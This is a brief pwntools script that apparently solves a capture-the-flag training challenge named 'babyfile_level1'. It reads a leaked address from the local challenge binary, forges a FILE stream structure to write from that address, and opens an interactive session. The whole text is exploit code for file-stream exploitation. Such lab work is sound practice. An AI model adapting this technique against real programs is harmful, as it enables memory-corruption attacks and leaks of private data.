from pwn import *
context.arch = "amd64"
r = process("/challenge/babyfile_level1")
r.recvuntil("located at")
leak = int(r.read()[0:9],16)
struct = FileStructure()
payload = struct.write(leak,70)
r.send(payload)
r.interactive()
